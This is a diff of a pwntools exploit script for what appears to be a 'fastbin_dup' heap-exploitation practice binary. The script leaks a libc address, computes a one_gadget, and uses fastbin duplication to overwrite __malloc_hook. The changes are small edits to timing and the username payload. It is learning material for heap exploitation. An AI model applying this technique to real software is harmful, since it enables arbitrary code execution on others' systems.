@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+
 from pwn import *
 
 BINARY = './fastbin_dup'
@@ -51,6 +52,7 @@ def free(io, index):
 
 def solve():
     io = conn()
+    io.timeout = 0.1
 
     io.recvuntil("puts() @ ")
     libc.address = int(io.recvline(), 16) - libc.sym.puts
@@ -60,10 +62,11 @@ def solve():
     one_gadget = libc.address + ONE_GADGET_OFFSET
     log.info("one_gadget found at: " + hex(one_gadget))
 
-    username = p64(0) + p64(0x31)
-    io.sendafter("Enter your username: ", username)
+    username = [
+        0xdeadbeefcafebabe
+    ]
+    io.sendafter("Enter your username: ", flat(username))
     io.recvuntil("> ")
-    io.timeout = 0.1
 
     # Allocate two chunks.
     chunk_a = malloc(io, 0x68, cyclic(0x68, n=8))
@@ -88,6 +91,7 @@ def solve():
     # Clear the fastbin until we reach our target chunk.
     malloc(io, 0x68, cyclic(0x68, n=8))
     malloc(io, 0x68, cyclic(0x68, n=8))
+
     """
     Allocate the fake chunk overlapping our __malloc_hook target and overwrite
     the __malloc_hook symbol with our one_gadget. We use 19 bytes of junk data
